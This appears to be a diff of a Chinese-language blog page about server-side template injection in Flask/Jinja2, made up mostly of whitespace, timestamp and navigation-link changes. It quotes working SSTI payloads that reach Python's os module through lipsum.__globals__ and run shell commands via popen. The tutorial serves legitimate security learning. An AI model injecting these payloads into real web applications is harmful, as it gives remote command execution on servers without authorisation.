@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357320.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358781.png">
 <meta property="article:published_time" content="2025-07-13T14:36:00.000Z">
-<meta property="article:modified_time" content="2025-07-13T16:03:02.344Z">
+<meta property="article:modified_time" content="2025-07-14T03:16:18.062Z">
 <meta property="article:author" content="sangnigege">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary_large_image">
@@ -381,9 +381,55 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 **注意：**`.`可以与`['']`互相替换，比如`__globals__['os']`可以换为`__globals__.os`，所以下面两句是等价的
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
 
 ![image-20250215214438190](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357234.png)
 
@@ -684,6 +730,12 @@ payload之一`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`�
 
 这里我们再提一下常见的内置函数和内置对象，
 
+
+
+
+
+
+
 | 类型         | 名称/方法              | 描述                                                         | 典型用途或示例                                               |
 | ------------ | ---------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
 | **内置函数** | `lipsum`               | 用于生成 Lorem Ipsum 占位文本，默认提供多段随机文本。        | 模板中填充测试内容：`&#123;&#123; lipsum() &#125;&#125;`。                       |
@@ -793,9 +845,9 @@ payload之一`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`�
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/07/13/GHCTF2025/" title="GHCTF2025">
+                      <a href="/2025/07/13/Flask%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" title="Flask安全问题">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">GHCTF2025</span>
+                        <span class="hidden-mobile">Flask安全问题</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -803,8 +855,8 @@ payload之一`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`�
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/07/13/SSTI%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" title="SSTI学习总结">
-                        <span class="hidden-mobile">SSTI学习总结</span>
+                      <a href="/2025/07/13/Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/" title="Web安全中的哈希函数">
+                        <span class="hidden-mobile">Web安全中的哈希函数</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
